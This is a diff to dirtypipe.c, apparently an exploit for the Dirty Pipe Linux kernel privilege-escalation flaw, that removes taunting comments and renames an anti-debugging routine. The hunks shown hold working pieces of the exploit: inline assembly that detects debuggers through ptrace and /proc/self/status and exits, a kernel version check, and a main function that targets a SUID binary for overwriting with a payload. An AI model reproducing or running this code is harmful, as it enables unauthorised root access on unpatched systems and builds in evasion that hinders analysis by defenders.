@@ -1,9 +1,4 @@
 
-
-// Some arrogant experts advised me to learn the basics. What do you think now, fake expert?
-// From Python to hacking your system's kernel, guess who's the expert now?
-// It turns out the problem wasn't the language, it was your way of thinking
-
 /*
  * Filename     : dirtypipe.c
  * Author       : Byte Reaper
@@ -245,35 +240,33 @@ int exP(const char* file_path, long target_offset, const uint8_t* payload, size_
 
 #define MSG_LEN (sizeof(message)-1)
 const char filename[] = "/proc/self/status";
-const char message[] = "[-] Anti-debug? Hahahahahah.\n";
+const char message[] = "[-] Anti-debug, exit!\n";
 const int msg_len = sizeof(message) - 1;
 
-// Since you're such an expert, I figured you'd appreciate this masterpiece
-
-void anti_arrogance() {
+//A simple addition
+void anti() {
     __asm__ __volatile__(
         /* Step 1: ptrace(PTRACE_TRACEME) to detect debugger */
         "movq $101, %%rax\n\t"
-        "movq $0,   %%rdi\n\t"   // PTRACE_TRACEME (spoiler: you lose)
+        "movq $0,   %%rdi\n\t"   // PTRACE_TRACEME 
         "xorq %%rsi, %%rsi\n\t"
         "xorq %%rdx, %%rdx\n\t"
         "syscall\n\t"
         "cmpq $-1, %%rax\n\t"  // Debugger detected if -1
-        "je   fail\n\t"         // You triggered it, rookie
+        "je   fail\n\t"        
 
         // --- Step 2: GDB sniffer ---
-        // Check /proc/self/status like a boss 
+        // Check /proc/self/status 
         "movq $257, %%rax\n\t"       // openat syscall
         "movq $-100, %%rdi\n\t"        // AT_FDCWD
         "leaq filename(%%rip), %%rsi\n\t" // "/proc/self/status"
         "movq $0,     %%rdx\n\t"         // O_RDONLY
         "syscall\n\t"
-        "cmpq $3,     %%rax\n\t"        // If less than 3, nahhh... denied.
+        "cmpq $3,     %%rax\n\t"        
         "jl   fail\n\t"
-        // --- Clean exit, you’re clear ---
+        // --- Clean exit---
         "jmp  done\n\t"
-
-        // --- Caught ya! Time to flex --
+    
         "fail:\n\t"
 
         "movq $1,   %%rax\n\t"
@@ -281,7 +274,7 @@ void anti_arrogance() {
         "leaq message(%%rip), %%rsi\n\t"
         "movq %[len], %%rdx\n\t"
         "syscall\n\t"
-        // Exit peacefully, you've embarrassed yourself enough
+        // Exit peacefully
         "movq $60,  %%rax\n\t"
         "xorq %%rdi, %%rdi\n\t"
         "syscall\n\t"
@@ -296,7 +289,7 @@ void anti_arrogance() {
 
 int main(int argc, char** argv) {
     check_kernelVersion();
-    anti_arrogance();    //Don't forget to deactivate it if you're done with the illusion that you're talking about, expert, hahaha.
+    anti();   
     if (argc != 2) {
         fprintf(stderr, "[-] Usage: %s <Path to SUID Binary>\n", argv[0]);
         return EXIT_FAILURE;
